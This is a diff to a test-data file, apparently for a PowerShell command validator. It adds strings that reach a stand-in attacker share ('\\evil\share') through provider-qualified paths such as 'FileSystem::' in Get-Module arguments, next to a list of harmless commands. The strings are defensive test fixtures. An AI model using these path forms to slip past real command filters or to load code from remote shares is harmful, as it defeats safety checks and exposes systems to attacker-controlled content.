@@ -122,6 +122,13 @@ export const arrayAndNetwork = [
   "Get-Content -Path:\\??\\UNC\\evil\\share\\x",
   "Get-Content -Path \\??\\UNC\\evil\\share\\x",
   "Get-Process -Name:\\??\\UNC\\evil\\s",
+  // Provider-qualified shares in non-path positions (class 6).
+  "Get-Module -ListAvailable -Name FileSystem::\\\\evil\\share\\m",
+  "Get-Module -ListAvailable FileSystem::\\\\evil\\share\\m",
+  "Get-Module -ListAvailable -Name:FileSystem::\\\\evil\\share\\m",
+  "Get-Module -ListAvailable -FullyQualifiedName FileSystem::\\\\evil\\share\\m",
+  "Get-Module -ListAvailable -Name Microsoft.PowerShell.Core\\FileSystem::\\\\evil\\share\\m",
+  "Get-Module -ListAvailable -Name FileSystem:://evil/share/m",
 ]
 
 export const arrayAndNetworkOk = ["Get-Date -Format HH:mm", "Get-Date -Format:HH:mm", "Get-Process -Name a,b", "tasklist /fo:csv", "tasklist /FI:x", "getmac /fo:csv /nh"]
